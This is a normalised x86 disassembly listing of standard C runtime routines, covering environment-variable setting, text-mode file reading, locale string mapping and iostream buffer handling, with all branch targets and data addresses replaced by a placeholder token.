jne rwxdata
sub_427c5f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je rwxdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_426137
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je rwxdata
cmp [ ebp + 0x8 ] esi
je rwxdata
mov eax [ rwxdata ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rwxdata ]
jne rwxdata
cmp eax edi
jne rwxdata
push eax
call sub_427e3e
pop ecx
mov [ rwxdata ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rwxdata ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_427de6
mov esi eax
pop ecx
test esi esi
pop ecx
jl rwxdata
cmp [ ebp + 0xc ] edi
je rwxdata
test ebx ebx
jne rwxdata
cmp [ edi ] 0x0
je rwxdata
cmp ebx edi
jne rwxdata
cmp [ rwxdata ] edi
je rwxdata
xor eax eax
jmp rwxdata
test esi esi
jge rwxdata
test ebx ebx
je rwxdata
push 0x4
call sub_42304d
cmp eax edi
pop ecx
mov [ rwxdata ] eax
je rwxdata
call sub_426633
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_422c4a
pop ecx
test eax eax
pop ecx
je rwxdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp rwxdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_423e39
pop ecx
mov [ eax ] edi
cmp [ rwxdata ] edi
jne rwxdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je rwxdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_422c4a
pop ecx
test eax eax
pop ecx
je rwxdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp rwxdata
push 0x4
call sub_42304d
cmp eax edi
pop ecx
mov [ rwxdata ] eax
je rwxdata
push [ ebp + 0x8 ]
call sub_4224c0
inc eax
inc eax
push eax
call sub_42304d
mov esi eax
pop ecx
test esi esi
pop ecx
je rwxdata
jmp rwxdata
cmp [ edi ] 0x0
je rwxdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_422540
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_423e39
pop ecx
mov [ rwxdata ] eax
sub_427de6
push esi
mov esi [ rwxdata ]
push edi
mov eax [ esi ]
test eax eax
je rwxdata
mov eax esi
sub eax [ rwxdata ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne rwxdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je rwxdata
push edi
push eax
push [ esp + 0x14 ]
call sub_4265f4
add esp 0xc
test eax eax
jne rwxdata
mov eax esi
sub eax [ rwxdata ]
sar eax 0x2
jmp rwxdata
test al al
je rwxdata
pop edi
pop esi
retn
sub_427e3e
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne rwxdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je rwxdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_42304d
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne rwxdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne rwxdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_422c01
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_428552
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp rwxdata
test eax eax
je rwxdata
sub_427eae
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rwxdata ]
mov eax [ eax * 4 + rwxdata ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je rwxdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je rwxdata
xor eax eax
jmp rwxdata
test dl 0x2
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je rwxdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne rwxdata
mov al [ eax + 0x5 ]
cmp al 0xa
je rwxdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je rwxdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne rwxdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp rwxdata
test edx edx
je rwxdata
cmp eax 0x6d
jne rwxdata
mov [ rwxdata ] 0x9
mov [ rwxdata ] ecx
jmp rwxdata
and al 0xfb
cmp [ edi ] 0xa
jne rwxdata
push eax
call sub_42658d
pop ecx
jmp rwxdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je rwxdata
or al 0x4
jmp rwxdata
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne rwxdata
cmp al 0xd
je rwxdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae rwxdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae rwxdata
mov [ edi ] al
inc edi
inc [ ebp + 0x10 ]
jmp rwxdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne rwxdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne rwxdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb rwxdata
cmp [ ebp - 0xc ] 0x0
je rwxdata
call [ GetLastError@IAT ]
test eax eax
jne rwxdata
mov [ edi ] 0xd
inc edi
mov [ ebp + 0x10 ] eax
jmp rwxdata
add [ ebp + 0x10 ] 0x2
jmp rwxdata
jmp rwxdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je rwxdata
mov [ edi ] 0xa
jmp rwxdata
cmp edi [ ebp + 0xc ]
jne rwxdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je rwxdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4266a1
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je rwxdata
cmp [ ebp - 0x1 ] 0xa
jne rwxdata
mov [ edi ] 0xd
mov ecx [ ebx ]
inc edi
mov [ ecx + esi + 0x5 ] al
jmp rwxdata
sub_4280a4
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ ebp + 0x14 ] edi
jle rwxdata
push edi
push edi
push 0x1
pop ebx
push ebx
push rwxdata
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x2
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_427c34
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push rwxdata
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je rwxdata
mov [ rwxdata ] ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp rwxdata
xor eax eax
mov [ rwxdata ] 0x2
cmp [ ebp + 0x20 ] edi
jne rwxdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_427490
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp - 0x24 ] edi
je rwxdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je rwxdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je rwxdata
test [ ebp + 0xd ] 0x4
je rwxdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_427490
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp + 0x1c ] edi
je rwxdata
cmp ebx edi
je rwxdata
mov eax esi
jmp rwxdata
cmp esi [ ebp + 0x1c ]
jg rwxdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne rwxdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp rwxdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je rwxdata
sub_4282c8
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rwxdata ]
xor ebx ebx
cmp eax ebx
jne rwxdata
cmp eax 0x2
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push rwxdata
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je rwxdata
cmp eax 0x1
jne rwxdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push rwxdata
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je rwxdata
mov eax esi
jmp rwxdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp rwxdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_427490
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_422720
add esp 0xc
jmp rwxdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je rwxdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je rwxdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp rwxdata
sub_428411
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
push ebx
jne rwxdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge rwxdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl rwxdata
mov edx [ rwxdata ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
pop ebx
leave
retn
cmp eax 0x7a
jg rwxdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_4284dd
pop ecx
pop ecx
jmp rwxdata
sub eax 0x20
jmp rwxdata
mov eax ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rwxdata ]
call sub_4280a4
add esp 0x20
test eax eax
je rwxdata
test eax eax
jne rwxdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp rwxdata
sub_4284dd
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja rwxdata
mov ecx eax
push esi
mov esi [ rwxdata ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je rwxdata
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
jmp rwxdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp rwxdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_4282c8
add esp 0x1c
test eax eax
jne rwxdata
sub_428552
push esi
mov esi [ esp + 0x8 ]
test esi esi
je rwxdata
xor eax eax
pop esi
retn
push esi
call sub_4224c0
inc eax
push eax
call sub_42304d
pop ecx
test eax eax
pop ecx
je rwxdata
push esi
push eax
call sub_422540
pop ecx
pop ecx
pop esi
retn
sub_4286ea
mov eax sub_42ce10
call sub_42b24c
push ecx
push ecx
xor eax eax
mov [ ebp - 0x10 ] ecx
cmp [ rwxdata ] eax
mov [ ebp - 0x14 ] eax
jl rwxdata
push ebx
push edi
push 0x1
mov edi rwxdata
pop ebx
mov [ ebp - 0x14 ] edi
mov [ rwxdata ] ebx
mov [ ebp - 0x4 ] eax
mov eax edi
test eax eax
je rwxdata
inc [ rwxdata ]
jmp rwxdata
mov ecx rwxdata
mov [ ebp - 0x14 ] ecx
mov eax ecx
mov [ ebp - 0x4 ] ebx
test eax eax
je rwxdata
push rwxdata
mov ecx edi
call sub_428a0a
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
leave
retn
push esi
mov esi rwxdata
mov [ ebp - 0x14 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x2
test eax eax
je rwxdata
push rwxdata
call sub_428a0a
mov edi rwxdata
mov [ ebp - 0x14 ] edi
mov eax edi
mov [ ebp - 0x4 ] 0x3
test eax eax
je rwxdata
push ebx
push ebx
push edi
mov ecx esi
call sub_428943
mov eax [ rwxdata ]
mov ebx rwxdata
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax ebx
mov [ ebp - 0x4 ] 0x4
test eax eax
je rwxdata
push ebx
push ebx
push ebx
push rwxdata
mov ecx edi
call sub_42886f
mov esi rwxdata
mov [ ebp - 0x14 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x5
test eax eax
je rwxdata
push rwxdata
mov ecx ebx
call sub_428a0a
mov eax [ rwxdata ]
mov ecx rwxdata
mov [ ebp - 0x14 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax [ rwxdata ]
mov eax [ eax + 0x4 ]
or [ eax + esi + 0xc ] 0x2
add eax esi
mov eax ecx
mov [ ebp - 0x4 ] 0x6
test eax eax
pop esi
je rwxdata
push 0x1
push 0x1
push 0x1
push ebx
mov ecx esi
call sub_42886f
mov eax [ rwxdata ]
mov eax [ eax + 0x4 ]
mov [ eax + rwxdata ] edi
pop edi
pop ebx
push 0x1
push 0x1
push 0x1
push ebx
call sub_42886f
sub_42886f
mov eax sub_42ce36
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x14 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov ecx [ esi ]
cmp [ ebp + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi ] rwxdata
je rwxdata
mov [ esi ] rwxdata
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
add ecx esi
call sub_4291b1
sub_4288d9
mov eax sub_42ce5a
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_42a66a
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] rwxdata
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_428943
mov eax sub_42ce7e
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x10 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_4291b1
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi ] rwxdata
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_4289ab
mov eax sub_42cea2
call sub_42b24c
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je rwxdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] rwxdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_42a66a
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] rwxdata
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] rwxdata
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_428a0a
mov eax sub_42ceca
call sub_42b24c
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x34 ]
call sub_428a6a
and [ ebp - 0x4 ] 0x0
mov ecx esi
mov [ esi ] rwxdata
call sub_4293d6
lea ecx [ esi + 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_428a6a
push 0x0
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] rwxdata
call sub_429248
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_428a6a
push esi
mov esi ecx
call sub_42a810
mov [ esi ] eax
mov eax [ rwxdata ]
mov ecx [ eax + 0x4 ]
cmp ecx 0xffffffff
jae rwxdata
mov eax esi
pop esi
retn
inc ecx
mov [ eax + 0x4 ] ecx
sub_428aa1
mov eax [ ecx + 0x4 ]
test eax eax
jbe rwxdata
mov eax [ ecx + 0x4 ]
neg eax
sbb eax eax
not eax
and eax ecx
retn
cmp eax 0xffffffff
jae rwxdata
dec eax
mov [ ecx + 0x4 ] eax
sub_428ad5
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne rwxdata
mov ecx esi
call sub_429201
movzx eax [ eax ]
pop esi
retn
or eax eax
pop esi
retn
sub_428af2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle rwxdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je rwxdata
mov ecx [ edi + 0x2c ]
mov esi [ ecx ]
test esi esi
jle rwxdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] esi
jge rwxdata
mov eax [ edi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
push esi
push eax
push ebx
call sub_422780
mov eax [ edi + 0x2c ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0xc
sub [ eax ] esi
mov eax [ edi + 0x1c ]
add ebx esi
add [ eax ] esi
jmp rwxdata
mov esi [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg rwxdata
sub_428b66
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle rwxdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
movzx ecx [ ebx ]
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp eax 0xffffffff
je rwxdata
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
test esi esi
jle rwxdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] esi
jge rwxdata
mov eax [ edi + 0x20 ]
mov eax [ eax ]
test eax eax
je rwxdata
push esi
push ebx
push eax
call sub_422780
mov eax [ edi + 0x30 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0xc
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add ebx esi
add [ eax ] esi
jmp rwxdata
mov esi [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg rwxdata
sub_428bec
mov eax sub_42cee7
call sub_42b24c
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] rwxdata
cmp [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
je rwxdata
mov edi [ esi + 0x44 ]
test edi edi
je rwxdata
call sub_429221
lea ecx [ esi + 0x4c ]
call sub_428a89
lea ecx [ esi + 0x34 ]
mov [ esi ] rwxdata
call sub_428a89
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x1
mov ecx edi
call sub_429175
push edi
call sub_42aa87
pop ecx
sub_428c51
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0xffffffff
push edi
mov esi ecx
jne rwxdata
mov eax [ esi + 0x20 ]
xor edi edi
mov eax [ eax ]
cmp eax edi
je rwxdata
xor eax eax
jmp rwxdata
mov eax [ esi + 0x50 ]
cmp eax edi
je rwxdata
mov ecx [ esi + 0x30 ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae rwxdata
pop edi
pop esi
pop ebx
leave
retn 0x4
or eax 0xffffffff
cmp [ esi + 0x38 ] edi
jne rwxdata
mov ecx esi
call sub_429211
mov [ eax ] bl
jmp rwxdata
push [ rwxdata ]
mov ecx [ esi + 0x44 ]
mov [ ebp - 0x1 ] bl
push edi
call sub_42910e
mov ecx [ esi + 0x44 ]
push edi
push 0x8
call sub_4290b5
mov edi [ esi + 0x44 ]
mov ecx edi
call sub_4292c0
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_4292c0
mov eax [ ebp - 0x8 ]
mov ecx [ edi + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx eax
neg eax
sbb eax eax
lea edi [ ebp - 0x10 ]
and eax ecx
push edi
mov ecx [ esi + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push ebx
mov edx [ ecx ]
push eax
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ esi + 0x40 ]
push eax
call [ edx + 0x14 ]
sub eax 0x0
je rwxdata
push eax
movsx eax bl
push eax
call sub_42b375
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
mov eax ebx
jmp rwxdata
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_4292c0
mov edi [ ebp - 0x10 ]
sub edi [ ebx + 0x4 ]
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_4292c0
push [ esi + 0x50 ]
mov ebx [ ebx + 0x4 ]
push edi
push 0x1
push ebx
call sub_42b26b
add esp 0x10
cmp eax edi
jne rwxdata
dec eax
je rwxdata
mov eax [ ebp + 0x8 ]
jmp rwxdata
lea eax [ ebp - 0x1 ]
cmp [ ebp - 0xc ] eax
je rwxdata
dec eax
dec eax
jne rwxdata
movsx eax [ ebp - 0x1 ]
push [ esi + 0x50 ]
push eax
call sub_42b375
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
jmp rwxdata
sub_428d87
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je rwxdata
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
cmp [ ecx ] eax
jae rwxdata
or eax 0xffffffff
cmp ebx 0xffffffff
je rwxdata
mov ebx [ esp + 0x10 ]
cmp ebx 0xffffffff
je rwxdata
cmp [ esi + 0x38 ] 0x0
jne rwxdata
mov ecx esi
call sub_4291f1
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp rwxdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne rwxdata
mov edi [ esi + 0x44 ]
mov ebx [ edi + 0x8 ]
test ebx ebx
jbe rwxdata
push eax
movzx eax bl
push eax
call sub_42b399
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x50 ]
test eax eax
je rwxdata
mov ecx edi
call sub_4292c0
mov edi [ edi + 0x4 ]
push ebx
